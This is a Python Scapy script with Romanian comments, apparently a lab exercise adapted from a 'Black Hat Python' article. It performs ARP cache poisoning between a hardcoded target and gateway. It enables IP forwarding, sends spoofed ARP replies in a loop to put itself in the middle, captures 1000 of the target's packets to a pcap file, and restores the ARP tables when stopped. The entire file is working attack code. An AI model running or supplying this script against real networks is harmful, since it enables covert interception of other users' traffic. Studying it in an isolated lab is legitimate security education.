from scapy.all import *
import os
import signal
import sys
import threading
import time

# Parametrii pentru ARP Poison
gateway_ip = "198.7.0.2"
gateway_mac = "02:42:c6:0a:00:03"
target_ip = "198.7.0.1"
target_mac = "02:42:c6:0a:00:01"
packet_count = 1000
conf.iface = "eth0"
conf.verb = 0

# Restaurarea rețelei prin inversarea atacului ARP Poison. Se trimite un ARP Reply broadcast cu informații corecte de MAC și IP
def restore_network(gateway_ip, gateway_mac, target_ip, target_mac):
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=gateway_ip, hwsrc=target_mac, psrc=target_ip), count=5)
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=target_ip, hwsrc=gateway_mac, psrc=gateway_ip), count=5)
    print("[*] Dezactivarea redirecționării IP")
    # Dezactivarea redirecționării IP pe Mac
    os.system("sysctl -w net.ipv4.ip_forward=0") 
    # Terminarea procesului pe Mac
    os.kill(os.getpid(), signal.SIGTERM)

# Se continuă trimiterea de răspunsuri false de ARP pentru a plasa mașina noastră în mijloc pentru a intercepta pachetele
# Se va utiliza adresa MAC a interfeței noastre ca hwsrc pentru răspunsul ARP
def arp_poison(gateway_ip, gateway_mac, target_ip, target_mac):
    print("[*] A început atacul ARP Poison [CTRL-C pentru a opri]")
    try:
        while True:
            send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip))
            send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip))
            time.sleep(2)
    except KeyboardInterrupt:
        print("[*] Atacul ARP Poison a fost oprit. Se restaurează rețeaua")
        restore_network(gateway_ip, gateway_mac, target_ip, target_mac)

# Se pornește scriptul
print("[*] Începerea scriptului: arp.py")
print("[*] Se activează redirecționarea IP")
# Se activează redirecționarea IP pe Mac
os.system("sysctl -w net.ipv4.ip_forward=1") 
print(f"[*] Adresa IP a gateway-ului: {gateway_ip}")
print(f"[*] Adresa IP a țintei: {target_ip}")

#gateway_mac = get_mac(gateway_ip)
if gateway_mac is None:
    print("[!] Imposibil de obținut adresa MAC a gateway-ului. Se încheie programul..")
    sys.exit(0)
else:
    print(f"[*] Adresa MAC a gateway-ului: {gateway_mac}")

#target_mac = get_mac(target_ip)
if target_mac is None:
    print("[!] Imposibil de obținut adresa MAC a țintei. Se încheie programul..")
    sys.exit(0)
else:
    print(f"[*] Adresa MAC a țintei: {target_mac}")

# Thread pentru ARP Poison
poison_thread = threading.Thread(target=arp_poison, args=(gateway_ip, gateway_mac, target_ip, target_mac))
poison_thread.start()

# Se capturează traficul și se scrie în fișier. Captura este filtrată pe mașina țintă
try:
    sniff_filter = "ip host " + target_ip
    print(f"[*] Începerea capturii de rețea. Numărul de pachete: {packet_count}. Filtru: {sniff_filter}")
    packets = sniff(filter=sniff_filter, iface=conf.iface, count=packet_count)
    wrpcap(target_ip + "_capture.pcap", packets)
    print(f"[*] Se oprește captura de rețea.. Se restaurează rețeaua")
    restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
except KeyboardInterrupt:
    print(f"[*] Se oprește captura de rețea.. Se restaurează rețeaua")
    restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
    sys.exit(0)

#sursa: https://ismailakkila.medium.com/black-hat-python-arp-cache-poisoning-with-scapy-7cb1d8b9d242
